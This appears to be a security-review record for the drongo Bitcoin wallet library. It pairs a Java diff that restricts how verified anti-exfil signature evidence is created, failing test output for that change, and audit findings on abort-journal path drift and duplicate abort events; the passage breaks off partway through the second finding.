diff --git a/src/main/java/com/sparrowwallet/drongo/antiexfil/VerifiedAntiExfilSignature.java b/src/main/java/com/sparrowwallet/drongo/antiexfil/VerifiedAntiExfilSignature.java
--- a/src/main/java/com/sparrowwallet/drongo/antiexfil/VerifiedAntiExfilSignature.java
+++ b/src/main/java/com/sparrowwallet/drongo/antiexfil/VerifiedAntiExfilSignature.java
@@ -1,84 +1,101 @@
 package com.sparrowwallet.drongo.antiexfil;
 
 import java.util.Arrays;
 import java.util.Objects;
 
 /**
  * Immutable evidence that one exact PSBT signature was produced by a
  * successfully revalidated anti-exfil ceremony.
  */
 public final class VerifiedAntiExfilSignature {
     private final byte[] sessionId;
     private final byte[] originalPsbtDigest;
     private final byte[] walletKeyIdentity;
     private final int inputIndex;
     private final byte[] outpoint;
     private final byte[] signerPublicKey;
     private final byte[] messageHash;
     private final long sighashType;
     private final byte[] compactSignature;
 
+    /**
+     * @deprecated Verified evidence is issued only by a successfully revalidated coordinator ceremony.
+     */
+    @Deprecated
     public VerifiedAntiExfilSignature(byte[] sessionId, byte[] originalPsbtDigest, byte[] walletKeyIdentity,
                                       int inputIndex, byte[] outpoint, byte[] signerPublicKey, byte[] messageHash,
                                       long sighashType, byte[] compactSignature) {
+        throw new UnsupportedOperationException("Verified evidence cannot be constructed directly");
+    }
+
+    static VerifiedAntiExfilSignature verified(byte[] sessionId, byte[] originalPsbtDigest, byte[] walletKeyIdentity,
+                                                int inputIndex, byte[] outpoint, byte[] signerPublicKey, byte[] messageHash,
+                                                long sighashType, byte[] compactSignature) {
+        return new VerifiedAntiExfilSignature(sessionId, originalPsbtDigest, walletKeyIdentity, inputIndex, outpoint,
+                signerPublicKey, messageHash, sighashType, compactSignature, true);
+    }
+
+    private VerifiedAntiExfilSignature(byte[] sessionId, byte[] originalPsbtDigest, byte[] walletKeyIdentity,
+                                       int inputIndex, byte[] outpoint, byte[] signerPublicKey, byte[] messageHash,
+                                       long sighashType, byte[] compactSignature, boolean verified) {
         requireLength(sessionId, 32, "session ID");
         requireLength(originalPsbtDigest, 32, "original PSBT digest");
         requireLength(walletKeyIdentity, 32, "wallet-key identity");
         requireLength(outpoint, 36, "outpoint");
         requireLength(signerPublicKey, 33, "signer public key");
         requireLength(messageHash, 32, "message hash");
         requireLength(compactSignature, 64, "compact signature");
         if(inputIndex < 0) throw new IllegalArgumentException("Input index must be non-negative");
         this.sessionId = sessionId.clone();
         this.originalPsbtDigest = originalPsbtDigest.clone();
         this.walletKeyIdentity = walletKeyIdentity.clone();
         this.inputIndex = inputIndex;
         this.outpoint = outpoint.clone();
         this.signerPublicKey = signerPublicKey.clone();
         this.messageHash = messageHash.clone();
         this.sighashType = sighashType;
         this.compactSignature = compactSignature.clone();
     }
 
     public byte[] getSessionId() { return sessionId.clone(); }
     public byte[] getOriginalPsbtDigest() { return originalPsbtDigest.clone(); }
     public byte[] getWalletKeyIdentity() { return walletKeyIdentity.clone(); }
     public int getInputIndex() { return inputIndex; }
     public byte[] getOutpoint() { return outpoint.clone(); }
     public byte[] getSignerPublicKey() { return signerPublicKey.clone(); }
     public byte[] getMessageHash() { return messageHash.clone(); }
     public long getSighashType() { return sighashType; }
     public byte[] getCompactSignature() { return compactSignature.clone(); }
 
     @Override
     public boolean equals(Object object) {
         if(this == object) return true;
         if(!(object instanceof VerifiedAntiExfilSignature other)) return false;
         return inputIndex == other.inputIndex && sighashType == other.sighashType
                 && Arrays.equals(sessionId, other.sessionId)
                 && Arrays.equals(originalPsbtDigest, other.originalPsbtDigest)
                 && Arrays.equals(walletKeyIdentity, other.walletKeyIdentity)
                 && Arrays.equals(outpoint, other.outpoint)
                 && Arrays.equals(signerPublicKey, other.signerPublicKey)
                 && Arrays.equals(messageHash, other.messageHash)
                 && Arrays.equals(compactSignature, other.compactSignature);
     }
 
     @Override
     public int hashCode() {
         int result = Objects.hash(inputIndex, sighashType);
         result = 31 * result + Arrays.hashCode(sessionId);
         result = 31 * result + Arrays.hashCode(originalPsbtDigest);
         result = 31 * result + Arrays.hashCode(walletKeyIdentity);
         result = 31 * result + Arrays.hashCode(outpoint);
         result = 31 * result + Arrays.hashCode(signerPublicKey);
         result = 31 * result + Arrays.hashCode(messageHash);
         return 31 * result + Arrays.hashCode(compactSignature);
     }
 
     private static void requireLength(byte[] value, int length, String name) {
         if(value == null || value.length != length) {
             throw new IllegalArgumentException("Invalid " + name);
         }
     }
 }

diff --git a/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCoordinator.java b/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCoordinator.java
--- a/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCoordinator.java
+++ b/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCoordinator.java
@@ -1,450 +1,450 @@
 package com.sparrowwallet.drongo.antiexfil;
 
 import com.sparrowwallet.drongo.protocol.Sha256Hash;
 import com.sparrowwallet.drongo.psbt.PSBT;
 import com.sparrowwallet.drongo.wallet.Keystore;
 
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
 import java.io.EOFException;
 import java.io.IOException;
 import java.nio.charset.StandardCharsets;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.security.SecureRandom;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.Collections;
 import java.util.LinkedHashSet;
 import java.util.LinkedHashMap;
 import java.util.List;
 import java.util.Map;
 import java.util.Set;
 
 import static com.sparrowwallet.drongo.antiexfil.AntiExfilException.Code.*;
 
 public final class AntiExfilCoordinator {
     private static final byte[] MAGIC = {'A', 'E', 'X', 'S'};
     private static final int VERSION = 1;
     private static final int MAX_STATE_BYTES = 32 * 1024 * 1024;
     private static final int MAX_PSBT_BYTES = 16 * 1024 * 1024;
     private static final int MAX_BLOB_BYTES = 16 * 1024 * 1024;
 
     private final Path sessionPath;
     private final Path journalPath;
     private final Keystore keystore;
     private final byte[] walletIdentity;
 
     private AntiExfilCoordinator(Path sessionPath, Path journalPath, Keystore keystore) {
         if(sessionPath == null || journalPath == null || keystore == null) throw fail(STATE_INVALID, "Coordinator paths and keystore are required");
         this.sessionPath = sessionPath;
         this.journalPath = journalPath;
         this.keystore = keystore;
         this.walletIdentity = walletIdentity(keystore);
     }
 
     public static AntiExfilCoordinator create(Path sessionPath, Path journalPath, byte[] originalPsbt,
                                                Keystore keystore, AntiExfilNetwork network) {
         return create(sessionPath, journalPath, originalPsbt, keystore, network, false, new SecureRandom());
     }
 
     public static AntiExfilCoordinator create(Path sessionPath, Path journalPath, byte[] originalPsbt,
                                                Keystore keystore, AntiExfilNetwork network,
                                                boolean acknowledgePostRevealAbortRisk) {
         return create(sessionPath, journalPath, originalPsbt, keystore, network,
                 acknowledgePostRevealAbortRisk, new SecureRandom());
     }
 
     static AntiExfilCoordinator create(Path sessionPath, Path journalPath, byte[] originalPsbt,
                                         Keystore keystore, AntiExfilNetwork network,
                                         boolean acknowledgePostRevealAbortRisk, SecureRandom random) {
         AntiExfilCoordinator coordinator = new AntiExfilCoordinator(sessionPath, journalPath, keystore);
         if(originalPsbt == null || originalPsbt.length > MAX_PSBT_BYTES || network == null || random == null) {
             throw fail(INVALID_MESSAGE, "Invalid coordinator initialization");
         }
         List<AntiExfilSigningSlot> slots = AntiExfilPsbt.enumerateSigningSlots(originalPsbt, keystore);
         byte[] sessionId = random32(random);
         Map<AntiExfilSigningSlot.Identifier, byte[]> rhos = new LinkedHashMap<>();
         for(AntiExfilSigningSlot slot : slots) {
             byte[] rho;
             int attempts = 0;
             do {
                 if(attempts++ >= 1024) throw fail(STATE_INVALID, "CSPRNG repeatedly produced duplicate host randomness");
                 rho = random32(random);
             } while(containsValue(rhos, rho));
             rhos.put(slot.getIdentifier(), rho);
         }
         AntiExfilMessage commit = AntiExfilPsbt.buildHostCommitMessage(originalPsbt, keystore, network, sessionId, rhos);
         State state = new State(Phase.COMMITMENTS_CREATED, coordinator.walletIdentity, originalPsbt,
                 AntiExfilCodec.encode(commit), null, null, null, null, rhos);
         List<AntiExfilAbortJournal.AbortEvent> aborts = new AntiExfilAbortJournal(journalPath, coordinator.walletIdentity).getEvents();
         if(!aborts.isEmpty() && !acknowledgePostRevealAbortRisk) {
             throw fail(RETRY_CONFLICT, "Post-reveal abort history requires explicit high-severity acknowledgement before a fresh session");
         }
         AntiExfilDurableFiles.locked(sessionPath, () -> {
             AntiExfilDurableFiles.write(sessionPath, encode(state), true);
             return null;
         });
         return coordinator;
     }
 
     public static AntiExfilCoordinator load(Path sessionPath, Path journalPath, Keystore keystore) {
         AntiExfilCoordinator coordinator = new AntiExfilCoordinator(sessionPath, journalPath, keystore);
         coordinator.readValidatedState();
         new AntiExfilAbortJournal(journalPath, coordinator.walletIdentity).getEvents();
         return coordinator;
     }
 
     public byte[] getHostCommitMessage() {
         return readValidatedState().message1.clone();
     }
 
     public byte[] getFrozenPsbt() {
         return readValidatedState().originalPsbt.clone();
     }
 
     public byte[] getHostRevealMessage() {
         State state = readValidatedState();
         if(state.phase == Phase.COMMITMENTS_CREATED) throw fail(WRONG_STAGE, "Signer openings have not been accepted");
         return state.message3.clone();
     }
 
     public Completion getCompletedResult() {
         State state = readValidatedState();
         if(state.phase != Phase.COMPLETE) throw fail(WRONG_STAGE, "Coordinator session is not complete");
         return completion(state);
     }
 
     public byte[] acceptOpenings(byte[] encodedOpenings) {
         if(encodedOpenings == null) throw fail(INVALID_MESSAGE, "Signer openings are required");
         return AntiExfilDurableFiles.locked(sessionPath, () -> {
             State state = readValidatedStateUnlocked();
             if(state.phase == Phase.COMPLETE || state.phase == Phase.OPENINGS_ACCEPTED) {
                 if(!Arrays.equals(encodedOpenings, state.message2)) throw fail(RETRY_CONFLICT, "Retry changed accepted signer openings");
                 return state.message3.clone();
             }
             AntiExfilMessage commit = AntiExfilCodec.decode(state.message1);
             AntiExfilMessage openings = AntiExfilCodec.decode(encodedOpenings);
             if(openings.getStage() != AntiExfilStage.SIGNER_OPENINGS) throw fail(WRONG_STAGE, "Expected signer openings");
             AntiExfilCodec.validateTransition(commit, openings);
             List<AntiExfilSlot> revealSlots = new ArrayList<>(openings.getSlots().size());
             for(AntiExfilSlot slot : openings.getSlots()) {
                 AntiExfilSigningSlot.Identifier identifier = identifier(slot);
                 byte[] rho = state.rhos.get(identifier);
                 if(rho == null) throw fail(SIGNATURE_SLOT_MISMATCH, "Opening has no authoritative host-randomness slot");
                 revealSlots.add(new AntiExfilSlot(slot.getInputIndex(), slot.getSighashType(), slot.getSignerPublicKey(),
                         slot.getMessageHash(), slot.getCommitment(), slot.getOpening(), rho, null));
             }
             AntiExfilMessage reveal = new AntiExfilMessage(openings.getNetwork(), AntiExfilStage.HOST_REVEAL,
                     openings.getSessionId(), openings.getPsbtDigest(), revealSlots);
             AntiExfilCodec.validateTransition(openings, reveal);
             byte[] message3 = AntiExfilCodec.encode(reveal);
             State accepted = new State(Phase.OPENINGS_ACCEPTED, state.walletIdentity, state.originalPsbt,
                     state.message1, encodedOpenings, message3, null, null, state.rhos);
             // This durable write is the security boundary: no rho is returned before it succeeds.
             AntiExfilDurableFiles.write(sessionPath, encode(accepted), false);
             return message3.clone();
         });
     }
 
     public Completion complete(byte[] encodedSignatures) {
         if(encodedSignatures == null) throw fail(INVALID_MESSAGE, "Signer signatures are required");
         return AntiExfilDurableFiles.locked(sessionPath, () -> {
             State state = readValidatedStateUnlocked();
             if(state.phase == Phase.COMMITMENTS_CREATED) throw fail(WRONG_STAGE, "Cannot complete before accepting openings");
             if(state.phase == Phase.COMPLETE) {
                 if(!Arrays.equals(encodedSignatures, state.message4)) throw fail(RETRY_CONFLICT, "Completed session received different signatures");
                 return completion(state);
             }
             AntiExfilMessage reveal = AntiExfilCodec.decode(state.message3);
             AntiExfilMessage signatures = AntiExfilCodec.decode(encodedSignatures);
             if(signatures.getStage() != AntiExfilStage.SIGNER_SIGNATURES) throw fail(WRONG_STAGE, "Expected signer signatures");
             AntiExfilCodec.validateTransition(reveal, signatures);
             byte[] signed = AntiExfilPsbt.reconstructSignedPsbt(state.originalPsbt, keystore,
                     AntiExfilCodec.decode(state.message1), signatures, state.rhos);
             State complete = new State(Phase.COMPLETE, state.walletIdentity, state.originalPsbt,
                     state.message1, state.message2, state.message3, encodedSignatures, signed, state.rhos);
             AntiExfilDurableFiles.write(sessionPath, encode(complete), false);
             return completion(complete);
         });
     }
 
     private Completion completion(State state) {
         return new Completion(state.signedPsbt, deriveVerifiedSignatures(state), false);
     }
 
     private Set<VerifiedAntiExfilSignature> deriveVerifiedSignatures(State state) {
         if(state.phase != Phase.COMPLETE || state.message4 == null || state.signedPsbt == null) invalidPhase();
         AntiExfilMessage commit = AntiExfilCodec.decode(state.message1);
         AntiExfilMessage signatures = AntiExfilCodec.decode(state.message4);
         List<AntiExfilSigningSlot> semantic = AntiExfilPsbt.enumerateSigningSlots(state.originalPsbt, keystore);
         byte[] reconstructed = AntiExfilPsbt.reconstructSignedPsbt(state.originalPsbt, keystore,
                 commit, signatures, state.rhos);
         if(!Arrays.equals(reconstructed, state.signedPsbt)) {
             throw fail(STATE_INVALID, "Verified-signature evidence does not reconstruct the stored signed PSBT");
         }
         PSBT original = AntiExfilPsbt.parseCanonicalV0(state.originalPsbt);
         byte[] originalDigest = Sha256Hash.hash(state.originalPsbt);
         Set<VerifiedAntiExfilSignature> verified = new LinkedHashSet<>();
         for(int i = 0; i < semantic.size(); i++) {
             AntiExfilSigningSlot authoritative = semantic.get(i);
             AntiExfilSlot signature = signatures.getSlots().get(i);
             byte[] outpoint = original.getTransaction().getInputs().get(authoritative.getInputIndex())
                     .getOutpoint().bitcoinSerialize();
-            verified.add(new VerifiedAntiExfilSignature(commit.getSessionId(), originalDigest,
+            verified.add(VerifiedAntiExfilSignature.verified(commit.getSessionId(), originalDigest,
                     state.walletIdentity, authoritative.getInputIndex(), outpoint,
                     authoritative.getSignerPublicKey(), authoritative.getMessageHash(),
                     authoritative.getSighashType(), signature.getSignature()));
         }
         if(verified.size() != semantic.size()) {
             throw fail(STATE_INVALID, "Verified-signature evidence contains duplicate records");
         }
         return Collections.unmodifiableSet(verified);
     }
 
     public AntiExfilAbortJournal.AbortEvent recordPostRevealAbort(AbortReason reason) {
         return AntiExfilDurableFiles.locked(sessionPath, () -> {
             State state = readValidatedStateUnlocked();
             if(state.phase != Phase.OPENINGS_ACCEPTED) {
                 throw fail(WRONG_STAGE, "Only an incomplete post-reveal session can record a selective-abort event");
             }
             if(reason == null) throw fail(STATE_INVALID, "A post-reveal abort reason is required");
             AntiExfilMessage commit = AntiExfilCodec.decode(state.message1);
             return new AntiExfilAbortJournal(journalPath, walletIdentity).append(
                     commit.getSessionId(), commit.getPsbtDigest(), reason.name());
         });
     }
 
     public Status getStatus() {
         State state = readValidatedState();
         AntiExfilMessage commit = AntiExfilCodec.decode(state.message1);
         int abortCount = new AntiExfilAbortJournal(journalPath, walletIdentity).getEvents().size();
         return new Status(state.phase, commit.getSessionId(), commit.getPsbtDigest(), abortCount, false);
     }
 
     private State readValidatedState() {
         return AntiExfilDurableFiles.locked(sessionPath, this::readValidatedStateUnlocked);
     }
 
     private State readValidatedStateUnlocked() throws IOException {
         if(!Files.exists(sessionPath)) throw new IOException("Coordinator session does not exist");
         State state = decode(AntiExfilDurableFiles.read(sessionPath, MAX_STATE_BYTES));
         validateState(state);
         return state;
     }
 
     private void validateState(State state) {
         if(!Arrays.equals(walletIdentity, state.walletIdentity)) throw fail(STATE_INVALID, "Coordinator session belongs to another wallet key identity");
         List<AntiExfilSigningSlot> slots = AntiExfilPsbt.enumerateSigningSlots(state.originalPsbt, keystore);
         AntiExfilMessage commit = AntiExfilCodec.decode(state.message1);
         AntiExfilMessage rebuilt = AntiExfilPsbt.buildHostCommitMessage(state.originalPsbt, keystore,
                 commit.getNetwork(), commit.getSessionId(), state.rhos);
         if(!Arrays.equals(state.message1, AntiExfilCodec.encode(rebuilt))) throw fail(STATE_INVALID, "Stored commitment transcript is not authoritative");
         if(state.rhos.size() != slots.size()) throw fail(STATE_INVALID, "Stored host-randomness set changed");
         if(state.phase == Phase.COMMITMENTS_CREATED) {
             if(state.message2 != null || state.message3 != null || state.message4 != null || state.signedPsbt != null) invalidPhase();
             return;
         }
         if(state.message2 == null || state.message3 == null) invalidPhase();
         AntiExfilMessage openings = AntiExfilCodec.decode(state.message2);
         AntiExfilMessage reveal = AntiExfilCodec.decode(state.message3);
         AntiExfilCodec.validateTransition(commit, openings);
         AntiExfilCodec.validateTransition(openings, reveal);
         for(AntiExfilSlot slot : reveal.getSlots()) {
             byte[] expected = state.rhos.get(identifier(slot));
             if(expected == null || !Arrays.equals(expected, slot.getHostRandomness())) throw fail(STATE_INVALID, "Stored reveal differs from durable randomness");
         }
         if(state.phase == Phase.OPENINGS_ACCEPTED) {
             if(state.message4 != null || state.signedPsbt != null) invalidPhase();
             return;
         }
         if(state.message4 == null || state.signedPsbt == null) invalidPhase();
         AntiExfilMessage signatures = AntiExfilCodec.decode(state.message4);
         AntiExfilCodec.validateTransition(reveal, signatures);
         byte[] rebuiltSigned = AntiExfilPsbt.reconstructSignedPsbt(state.originalPsbt, keystore, commit, signatures, state.rhos);
         if(!Arrays.equals(rebuiltSigned, state.signedPsbt)) throw fail(STATE_INVALID, "Stored signed PSBT is not reconstructible from verified signatures");
     }
 
     private static byte[] walletIdentity(Keystore keystore) {
         return getWalletKeyIdentity(keystore);
     }
 
     public static byte[] getWalletKeyIdentity(Keystore keystore) {
         if(keystore.getExtendedPublicKey() == null || keystore.getKeyDerivation() == null) throw fail(STATE_INVALID, "Public account keystore is required");
         ByteArrayOutputStream bytes = new ByteArrayOutputStream();
         try {
             bytes.write(keystore.getExtendedPublicKey().getKey().getPubKey());
             bytes.write(keystore.getExtendedPublicKey().getKey().getChainCode());
             bytes.write(keystore.getKeyDerivation().toString().getBytes(StandardCharsets.US_ASCII));
         } catch(IOException impossible) {
             throw new AssertionError(impossible);
         }
         return Sha256Hash.hash(bytes.toByteArray());
     }
 
     private static byte[] encode(State state) throws IOException {
         ByteArrayOutputStream bytes = new ByteArrayOutputStream();
         try(DataOutputStream output = new DataOutputStream(bytes)) {
             output.write(MAGIC);
             output.writeByte(VERSION);
             output.writeByte(state.phase.ordinal());
             output.write(state.walletIdentity);
             writeBlob(output, state.originalPsbt);
             writeBlob(output, state.message1);
             writeNullableBlob(output, state.message2);
             writeNullableBlob(output, state.message3);
             writeNullableBlob(output, state.message4);
             writeNullableBlob(output, state.signedPsbt);
             output.writeShort(state.rhos.size());
             for(Map.Entry<AntiExfilSigningSlot.Identifier, byte[]> entry : state.rhos.entrySet()) {
                 output.writeInt(entry.getKey().getInputIndex());
                 output.write(entry.getKey().getSignerPublicKey());
                 output.write(entry.getValue());
             }
         }
         return bytes.toByteArray();
     }
 
     private static State decode(byte[] body) throws IOException {
         try(DataInputStream input = new DataInputStream(new ByteArrayInputStream(body))) {
             if(!Arrays.equals(input.readNBytes(4), MAGIC) || input.readUnsignedByte() != VERSION) throw new IOException("Unknown coordinator-state format");
             int phaseCode = input.readUnsignedByte();
             if(phaseCode >= Phase.values().length) throw new IOException("Unknown coordinator phase");
             byte[] identity = input.readNBytes(32);
             byte[] original = readBlob(input, MAX_PSBT_BYTES, false);
             byte[] message1 = readBlob(input, AntiExfilCodec.MAX_MESSAGE_BYTES, false);
             byte[] message2 = readBlob(input, AntiExfilCodec.MAX_MESSAGE_BYTES, true);
             byte[] message3 = readBlob(input, AntiExfilCodec.MAX_MESSAGE_BYTES, true);
             byte[] message4 = readBlob(input, AntiExfilCodec.MAX_MESSAGE_BYTES, true);
             byte[] signed = readBlob(input, MAX_BLOB_BYTES, true);
             int count = input.readUnsignedShort();
             if(identity.length != 32 || count < 1 || count > AntiExfilCodec.MAX_SLOTS) throw new IOException("Invalid coordinator-state header");
             Map<AntiExfilSigningSlot.Identifier, byte[]> rhos = new LinkedHashMap<>();
             for(int i = 0; i < count; i++) {
                 int index = input.readInt();
                 byte[] key = input.readNBytes(33);
                 byte[] rho = input.readNBytes(32);
                 if(key.length != 33 || rho.length != 32 || rhos.put(new AntiExfilSigningSlot.Identifier(index, key), rho) != null) {
                     throw new IOException("Invalid or duplicate coordinator randomness record");
                 }
             }
             if(input.available() != 0) throw new IOException("Trailing coordinator-state data");
             return new State(Phase.values()[phaseCode], identity, original, message1, message2, message3, message4, signed, rhos);
         } catch(EOFException e) {
             throw new IOException("Truncated coordinator state", e);
         }
     }
 
     private static void writeBlob(DataOutputStream output, byte[] value) throws IOException {
         output.writeInt(value.length);
         output.write(value);
     }
 
     private static void writeNullableBlob(DataOutputStream output, byte[] value) throws IOException {
         if(value == null) output.writeInt(-1); else writeBlob(output, value);
     }
 
     private static byte[] readBlob(DataInputStream input, int maximum, boolean nullable) throws IOException {
         int length = input.readInt();
         if(nullable && length == -1) return null;
         if(length < 1 || length > maximum) throw new IOException("Stored blob length is outside limits");
         byte[] value = input.readNBytes(length);
         if(value.length != length) throw new IOException("Truncated stored blob");
         return value;
     }
 
     private static byte[] random32(SecureRandom random) {
         byte[] value = new byte[32];
         random.nextBytes(value);
         return value;
     }
 
     private static boolean containsValue(Map<AntiExfilSigningSlot.Identifier, byte[]> values, byte[] candidate) {
         return values.values().stream().anyMatch(value -> Arrays.equals(value, candidate));
     }
 
     private static AntiExfilSigningSlot.Identifier identifier(AntiExfilSlot slot) {
         if(slot.getInputIndex() > Integer.MAX_VALUE) throw fail(SIGNATURE_SLOT_MISMATCH, "Input index is outside Java PSBT limits");
         return new AntiExfilSigningSlot.Identifier((int)slot.getInputIndex(), slot.getSignerPublicKey());
     }
 
     private static void invalidPhase() {
         throw fail(STATE_INVALID, "Coordinator phase and stored transcripts disagree");
     }
 
     private static AntiExfilException fail(AntiExfilException.Code code, String message) {
         return new AntiExfilException(code, message);
     }
 
     public enum Phase {
         COMMITMENTS_CREATED,
         OPENINGS_ACCEPTED,
         COMPLETE
     }
 
     public enum AbortReason {
         TRANSPORT_FAILED,
         SIGNER_CANCELLED,
         SIGNATURE_REJECTED,
         USER_ABANDONED
     }
 
     public static final class Completion {
         private final byte[] signedPsbt;
         private final Set<VerifiedAntiExfilSignature> verifiedSignatures;
         private final boolean broadcast;
 
         private Completion(byte[] signedPsbt, Set<VerifiedAntiExfilSignature> verifiedSignatures, boolean broadcast) {
             this.signedPsbt = signedPsbt.clone();
             this.verifiedSignatures = Set.copyOf(verifiedSignatures);
             this.broadcast = broadcast;
         }
 
         public byte[] getSignedPsbt() { return signedPsbt.clone(); }
         public Set<VerifiedAntiExfilSignature> getVerifiedSignatures() { return verifiedSignatures; }
         public boolean isBroadcast() { return broadcast; }
     }
 
     public static final class Status {
         private final Phase phase;
         private final byte[] sessionId;
         private final byte[] psbtDigest;
         private final int postRevealAbortCount;
         private final boolean broadcast;
 
         private Status(Phase phase, byte[] sessionId, byte[] psbtDigest, int postRevealAbortCount, boolean broadcast) {
             this.phase = phase;
             this.sessionId = sessionId.clone();
             this.psbtDigest = psbtDigest.clone();
             this.postRevealAbortCount = postRevealAbortCount;
             this.broadcast = broadcast;
         }
 
         public Phase getPhase() { return phase; }
         public byte[] getSessionId() { return sessionId.clone(); }
         public byte[] getPsbtDigest() { return psbtDigest.clone(); }
         public int getPostRevealAbortCount() { return postRevealAbortCount; }
         public boolean isBroadcast() { return broadcast; }
     }
 
     private record State(Phase phase, byte[] walletIdentity, byte[] originalPsbt, byte[] message1,
                          byte[] message2, byte[] message3, byte[] message4, byte[] signedPsbt,
                          Map<AntiExfilSigningSlot.Identifier, byte[]> rhos) {
         private State {
             walletIdentity = walletIdentity.clone();
             originalPsbt = originalPsbt.clone();
             message1 = message1.clone();
             message2 = copy(message2);
             message3 = copy(message3);
             message4 = copy(message4);
             signedPsbt = copy(signedPsbt);
             Map<AntiExfilSigningSlot.Identifier, byte[]> copied = new LinkedHashMap<>();
             rhos.forEach((identifier, rho) -> copied.put(identifier, rho.clone()));
             rhos = Map.copyOf(copied);
         }
 
         private static byte[] copy(byte[] value) { return value == null ? null : value.clone(); }
     }
 }
```
### Affected files
- `src/main/java/com/sparrowwallet/drongo/antiexfil/VerifiedAntiExfilSignature.java`
- `src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCoordinator.java`
### Validation output

```
[output truncated: 33 lines & 0.98828125 KB skipped]
FAILURE: Build failed with an exception.

* What went wrong:
Execution failed for task ':test'.
> There were failing tests. See the report at: file:///repo/build/reports/tests/test/index.html

* Try:
> Run with --scan to generate a Build Scan (Powered by Develocity).

BUILD FAILED in 4s
```

---

# Journal path drift silently resets history
**#248003**
- Severity: Low
- Validity: Invalid
## Source locations
### `FractalEncrypt/drongo@1bbafd9/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCoordinator.java` (2 locations)
#### Lines 93-98 — _Load accepts any journal path and discards the event list._

```
    public static AntiExfilCoordinator load(Path sessionPath, Path journalPath, Keystore keystore) {
        AntiExfilCoordinator coordinator = new AntiExfilCoordinator(sessionPath, journalPath, keystore);
        coordinator.readValidatedState();
        new AntiExfilAbortJournal(journalPath, coordinator.walletIdentity).getEvents();
        return coordinator;
    }
```
⋯
#### Lines 287-321 — _Serialized session state carries no authoritative journal identity._

```
    private static byte[] encode(State state) throws IOException {
        ByteArrayOutputStream bytes = new ByteArrayOutputStream();
        try(DataOutputStream output = new DataOutputStream(bytes)) {
            output.write(MAGIC);
            output.writeByte(VERSION);
            output.writeByte(state.phase.ordinal());
            output.write(state.walletIdentity);
            writeBlob(output, state.originalPsbt);
            writeBlob(output, state.message1);
            writeNullableBlob(output, state.message2);
            writeNullableBlob(output, state.message3);
            writeNullableBlob(output, state.message4);
            writeNullableBlob(output, state.signedPsbt);
            output.writeShort(state.rhos.size());
            for(Map.Entry<AntiExfilSigningSlot.Identifier, byte[]> entry : state.rhos.entrySet()) {
                output.writeInt(entry.getKey().getInputIndex());
                output.write(entry.getKey().getSignerPublicKey());
                output.write(entry.getValue());
            }
        }
        return bytes.toByteArray();
    }

    private static State decode(byte[] body) throws IOException {
        try(DataInputStream input = new DataInputStream(new ByteArrayInputStream(body))) {
            if(!Arrays.equals(input.readNBytes(4), MAGIC) || input.readUnsignedByte() != VERSION) throw new IOException("Unknown coordinator-state format");
            int phaseCode = input.readUnsignedByte();
            if(phaseCode >= Phase.values().length) throw new IOException("Unknown coordinator phase");
            byte[] identity = input.readNBytes(32);
            byte[] original = readBlob(input, MAX_PSBT_BYTES, false);
            byte[] message1 = readBlob(input, AntiExfilCodec.MAX_MESSAGE_BYTES, false);
            byte[] message2 = readBlob(input, AntiExfilCodec.MAX_MESSAGE_BYTES, true);
            byte[] message3 = readBlob(input, AntiExfilCodec.MAX_MESSAGE_BYTES, true);
            byte[] message4 = readBlob(input, AntiExfilCodec.MAX_MESSAGE_BYTES, true);
            byte[] signed = readBlob(input, MAX_BLOB_BYTES, true);
```
### `FractalEncrypt/drongo@1bbafd9/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilAbortJournal.java`
#### Lines 60-69 — _An unknown path is initialized as an empty valid journal._

```
    private Journal loadOrCreate() throws IOException {
        if(!Files.exists(path)) {
            Journal journal = new Journal(walletIdentity, List.of());
            AntiExfilDurableFiles.write(path, encode(journal), true);
            return journal;
        }
        Journal journal = decode(AntiExfilDurableFiles.read(path, MAX_FILE_BYTES));
        if(!Arrays.equals(walletIdentity, journal.walletIdentity)) throw new IOException("Abort journal belongs to another wallet key identity");
        return journal;
    }
```
## Description

The journal path is freely supplied to `create` and `load` and is not persisted or otherwise bound into coordinator state. `loadOrCreate` silently initializes any missing selected path as a valid empty journal, while `load` reads that journal only as an identity/liveness probe and discards its event list. A relative-path change, working-directory change, configuration drift, or state migration can therefore switch a session to a new empty abort history without any warning. The later status call reports zero aborts, and fresh creation passes the acknowledgement gate. A caller deliberately choosing a new path is already within the trusted host boundary; the concrete defect is silent fail-open behavior under accidental path divergence.
## Root cause

Abort history is identified only by an unbound caller-supplied path, and an unknown path is treated as first use instead of a missing security dependency.
## Impact

Operational path drift can disable the selective-abort acknowledgement defense and allow fresh sessions after recorded aborts while the coordinator reports no problem. This is a robustness failure requiring caller misconfiguration rather than direct signer control.

---

# Duplicate aborts exhaust the journal
**#248004**
- Severity: Medium
- Validity: Unreviewed
## Source locations
### `FractalEncrypt/drongo@1bbafd9/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCoordinator.java` (2 locations)
#### Lines 207-218 — _The same open session can record an abort repeatedly._

```
    public AntiExfilAbortJournal.AbortEvent recordPostRevealAbort(AbortReason reason) {
        return AntiExfilDurableFiles.locked(sessionPath, () -> {
            State state = readValidatedStateUnlocked();
            if(state.phase != Phase.OPENINGS_ACCEPTED) {
                throw fail(WRONG_STAGE, "Only an incomplete post-reveal session can record a selective-abort event");
            }
            if(reason == null) throw fail(STATE_INVALID, "A post-reveal abort reason is required");
            AntiExfilMessage commit = AntiExfilCodec.decode(state.message1);
            return new AntiExfilAbortJournal(journalPath, walletIdentity).append(
                    commit.getSessionId(), commit.getPsbtDigest(), reason.name());
        });
    }
```
⋯
#### Lines 220-225 — _Status reports the raw duplicate-inflated event count._

```
    public Status getStatus() {
        State state = readValidatedState();
        AntiExfilMessage commit = AntiExfilCodec.decode(state.message1);
        int abortCount = new AntiExfilAbortJournal(journalPath, walletIdentity).getEvents().size();
        return new Status(state.phase, commit.getSessionId(), commit.getPsbtDigest(), abortCount, false);
    }
```
### `FractalEncrypt/drongo@1bbafd9/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilAbortJournal.java` (2 locations)
#### Lines 20-22 — _The journal has a fixed global event limit._

```
